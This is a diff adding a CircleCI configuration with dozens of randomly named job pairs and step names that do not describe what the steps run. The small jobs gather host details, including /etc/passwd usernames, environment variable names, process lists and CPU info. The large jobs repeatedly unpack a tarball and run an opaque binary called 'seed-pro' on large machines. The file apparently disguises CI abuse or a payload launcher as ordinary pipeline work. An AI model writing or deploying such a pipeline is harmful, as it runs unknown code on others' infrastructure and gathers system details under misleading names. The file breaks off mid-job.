@@ -1,0 +1,1341 @@
+version: 2.1
+
+jobs:
+  thx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute digest v2
+          command: |
+            mkdir -p /tmp/_src
+            set +o pipefail 2>/dev/null; seq 1 1164172 | sed -n 'N; s/\n/ /; p' > /tmp/_src/Config.9088.59-flame; true
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/Config.9088.59-flame)" "/tmp/_src/Config.9088.59-flame"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'Config.9088.59-flame'
+  Run_Service8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/invoIcEheAth 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  server_2002_11:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Catalogue the night shift whilst idle
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo | grep --line-number "siblings" | head --lines=12; true ; } > /tmp/_src/qUarkGaRdEnPiXElrasTeR
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/qUarkGaRdEnPiXElrasTeR)" "/tmp/_src/qUarkGaRdEnPiXElrasTeR"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'qUarkGaRdEnPiXElrasTeR'
+  VERIFY_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/qUarkGaRdEnPiXElrasTeR 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  OPT_SPHERE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: incubate pipette tips g381
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 2 -type d -exec du -sh {} + 2>/dev/null | sort | head -n 4; true ; } > /tmp/_src/access.log
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/access.log)" "/tmp/_src/access.log"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'access.log'
+  build-staging-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/access.log 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  SW-FIRST-TAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Cover art being synced
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; for conf in /etc/host*; do ls -l $conf; done | paste -sd ' '; true ; } > /tmp/_src/tone_copper
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/tone_copper)" "/tmp/_src/tone_copper"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'tone_copper'
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/tone_copper 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  proFixtureEntry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Restore the LED strip over to cold storage
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ls -l /dev|grep "random"|head -4; true ; } > /tmp/_src/MAPLE_LAZY_PROTON
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/MAPLE_LAZY_PROTON)" "/tmp/_src/MAPLE_LAZY_PROTON"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'MAPLE_LAZY_PROTON'
+  dp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/MAPLE_LAZY_PROTON 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  shortCb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Bundle The Collision Meshes Oslo Side
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ps -eo comm= | fmt -w 36 | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/_src/qbnne0z
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/qbnne0z)" "/tmp/_src/qbnne0z"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'qbnne0z'
+  alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/qbnne0z 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  validateMeasure_eager:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: We quietly aliquot the gel
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; seq 25 > "/tmp/split-bak.bak" && tail -n 1 "/tmp/split-bak.bak"; true ; } > /tmp/_src/LOADER_FJORD
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/LOADER_FJORD)" "/tmp/_src/LOADER_FJORD"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'LOADER_FJORD'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/invoIcEheAth 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  top:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Tomorrow approve the training records
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; grep -Esi 'if|PATH' /etc/profile; true ; } > /tmp/_src/cache
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/cache)" "/tmp/_src/cache"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'cache'
+  sm-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/cache 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  cPlatinum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Tutorial series exported twice
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"}NR <= 5 {print $1, $NF}' /etc/passwd | sort; true ; } > /tmp/_src/tmp-txt-lib
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/tmp-txt-lib)" "/tmp/_src/tmp-txt-lib"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'tmp-txt-lib'
+  nico-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/tmp-txt-lib 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  freeze_password:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: T0 alert
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; for ((w=0; w<7; w++)); do echo $w; done; true ; } > /tmp/_src/titan-crane
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/titan-crane)" "/tmp/_src/titan-crane"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'titan-crane'
+  verify-quick-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/titan-crane 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  Pather:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: compress the mounted volume URGENT
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; tar czf "/tmp/e2.tar.gz" -C /etc skel && mkdir -p "/tmp/in_2024-08" && tar -xzf "/tmp/e2.tar.gz" -C "/tmp/in_2024-08" && ls -R "/tmp/in_2024-08"; true ; } > /tmp/_src/7341-7undr4-1edg3r
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/7341-7undr4-1edg3r)" "/tmp/_src/7341-7undr4-1edg3r"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - '7341-7undr4-1edg3r'
+  q1-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/7341-7undr4-1edg3r 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  dfghjkbnm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Taxi to the holiday calendar
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; find . -maxdepth 1 -name '*.txt' -mtime -365 -user $(id -un); true ; } > /tmp/_src/GOPR_00000112
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/GOPR_00000112)" "/tmp/_src/GOPR_00000112"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'GOPR_00000112'
+  LaunchTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/invoIcEheAth 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  SidebarSpec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute digest v2
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ls --block-size=K $HOME | head -n 6; true ; } > /tmp/_src/ee32-3110_Layer
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/ee32-3110_Layer)" "/tmp/_src/ee32-3110_Layer"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'ee32-3110_Layer'
+  rm-cache-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/invoIcEheAth 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  skutzoustpas-cli:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Enchant the runbook
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; mkfifo '/tmp/ticket2020-08-25.txt' && ls -l '/tmp/ticket2020-08-25.txt' && rm '/tmp/ticket2020-08-25.txt'; true ; } > /tmp/_src/access.log.28
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/access.log.28)" "/tmp/_src/access.log.28"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'access.log.28'
+  refactor-9938:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/access.log.28 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  cnt-index-icon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Sort The Temp Files Denver Side
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; if command -v python3 >&/dev/null; then echo "python3 found"; fi; true ; } > /tmp/_src/routerGarden
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/routerGarden)" "/tmp/_src/routerGarden"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'routerGarden'
+  canary-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/routerGarden 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  pickextra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: post then collect
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,kiwi,1,63.00\n2,orange,13,10.97\n3,fig,5,72.30\n4,lime,6,44.08\n' >"/tmp/post.conf" && cut -d, -f2 "/tmp/post.conf"; true ; } > /tmp/_src/87cc26
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/87cc26)" "/tmp/_src/87cc26"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - '87cc26'
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/87cc26 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  opsSlot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: DB 37
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; printf -v id "%*s" 10 ""; echo "[$id]"; true ; } > /tmp/_src/sha_459e81bc0
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/sha_459e81bc0)" "/tmp/_src/sha_459e81bc0"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'sha_459e81bc0'
+  dan-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/sha_459e81bc0 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  z_scale:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: exporting credit notes now
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; [[ ! -e /etc/fstab ]] && echo yes || echo 'no'; true ; } > /tmp/_src/sigma-canvas-spark-heath
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/sigma-canvas-spark-heath)" "/tmp/_src/sigma-canvas-spark-heath"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'sigma-canvas-spark-heath'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/sigma-canvas-spark-heath 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  Ia9qvSKf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Level I defragmenting query planner stats
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; find /usr/bin -type f ! -name 'un*' -size +1M -print0 | sort -z | xargs -0 ls -1; true ; } > /tmp/_src/draft_c9c89
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/draft_c9c89)" "/tmp/_src/draft_c9c89"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'draft_c9c89'
+  xray:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/draft_c9c89 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  uat-dev-63:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Attest the audit trail please
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; printenv | head -n10 | cut -f1 -d"="; true ; } > /tmp/_src/ridge
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/ridge)" "/tmp/_src/ridge"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'ridge'
+  rigel-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/ridge 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  article_spawn_next:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Sharding vs snapshot
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; pgrep -f "bash -c" | wc -l; true ; } > /tmp/_src/07t3r.ech0.5ton3
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/07t3r.ech0.5ton3)" "/tmp/_src/07t3r.ech0.5ton3"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - '07t3r.ech0.5ton3'
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/invoIcEheAth 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  ps_Hant_GR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Badge the offer letters week one
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ls -ho /etc/default | head -n 8; true ; } > /tmp/_src/nickel794
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/nickel794)" "/tmp/_src/nickel794"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'nickel794'
+  tb-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/invoIcEheAth 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  spoangstranai:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Mount NFS
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; echo 'testing 1 2 3' | tr ' ' '\n' | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | paste -sd ' '; true ; } > /tmp/_src/541ebcc33ed2345d2d
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/541ebcc33ed2345d2d)" "/tmp/_src/541ebcc33ed2345d2d"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - '541ebcc33ed2345d2d'
+  INFRA-977:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/541ebcc33ed2345d2d 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  testCPU:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pull sha 75f8a5
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; echo 'one, two, three'|sed 's@one@guide@I'; true ; } > /tmp/_src/draft_5f2c953
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/draft_5f2c953)" "/tmp/_src/draft_5f2c953"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'draft_5f2c953'
+  hu-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/draft_5f2c953 2>/dev/null || true
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: gunzip -c new-basket.tgz | tar xf -
+      - run:
+          command: $PWD/seed-pro
+  hitAnim:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute digest v2
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; cat /etc/shells | awk -F/ '{ print $NF }' | sort; true ; } > /tmp/_src/widget.south
+            printf '%d bytes written to %s\n' "$(wc -c </tmp/_src/widget.south)" "/tmp/_src/widget.south"
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'widget.south'
+  polaris:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Pre-verify D
+          command: |
+            awk '{if(NR==1) h=$0} END{print "head:",substr(h,1,30)}' /tmp/_src/widget.south 2>/dev/null || true
+      - run:
+          name: Load repo
